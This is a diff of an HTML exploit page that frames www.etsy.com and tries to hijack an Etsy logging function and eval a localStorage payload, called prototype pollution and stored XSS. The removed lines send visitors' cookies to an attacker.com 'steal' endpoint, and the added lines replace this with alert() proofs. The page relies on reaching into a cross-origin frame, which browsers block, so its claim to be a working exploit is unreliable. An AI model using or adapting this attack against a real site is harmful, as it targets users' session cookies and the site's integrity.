@@ -2,6 +2,7 @@
 <html>
 <head>
     <title>Loading...</title>
+    <meta http-equiv="refresh" content="2;url=https://www.etsy.com">
     <style>
         iframe {
             position: absolute;
@@ -16,33 +17,37 @@
 </head>
 <body>
 
-    <!-- Auto-executing iframe -->
-    <iframe id="targetIframe" src="https://etsy.com" sandbox="allow-scripts allow-same-origin"></iframe>
-
     <script>
-        window.onload = function() {
-            let iframe = document.getElementById("targetIframe").contentWindow;
+        // ** Step 1: Delay Before Injecting Exploit **
+        setTimeout(() => {
+            // Open an invisible iframe targeting Etsy
+            let iframe = document.createElement("iframe");
+            iframe.src = "https://www.etsy.com";
+            iframe.sandbox = "allow-scripts allow-same-origin";
+            document.body.appendChild(iframe);
 
-            // Wait for iframe to load before executing
-            setTimeout(() => {
+            // Ensure iframe loads before executing the exploit
+            iframe.onload = function() {
+                let iwin = iframe.contentWindow;
+                
                 try {
-                    // **Step 1: Auto Exploit Prototype Pollution**
-                    iframe.window.__etsy_logging.eventpipe.logEventImmediately = function(payload) {
-                        fetch("https://attacker.com/steal?data=" + encodeURIComponent(document.cookie));
+                    // ** Step 2: Exploit Prototype Pollution **
+                    iwin.__etsy_logging.eventpipe.logEventImmediately = function(payload) {
+                        alert("Prototype Pollution Exploited! Payload: " + payload);
                     };
-                    iframe.window.__etsy_logging.eventpipe.logEventImmediately("Injected XSS via Prototype Pollution!");
+                    iwin.__etsy_logging.eventpipe.logEventImmediately("Injected XSS via Prototype Pollution!");
 
-                    // **Step 2: Auto Execute Stored XSS from LocalStorage**
-                    iframe.localStorage.setItem("xss_payload", "fetch('https://attacker.com/steal?data=' + document.cookie);");
-                    const payload = iframe.localStorage.getItem("xss_payload");
+                    // ** Step 3: Inject & Auto-Execute Stored XSS via LocalStorage **
+                    iwin.localStorage.setItem("xss_payload", "alert('Stored XSS Triggered!');");
+                    const payload = iwin.localStorage.getItem("xss_payload");
                     if (payload) {
-                        iframe.eval(payload); // Auto-execute the stored XSS payload
+                        iwin.eval(payload); // Execute stored XSS
                     }
                 } catch (e) {
                     console.log("Exploit failed:", e);
                 }
-            }, 3000); // Slight delay to ensure iframe is fully loaded
-        };
+            };
+        }, 4000); // Delay exploit execution after redirection
     </script>
 
 </body>
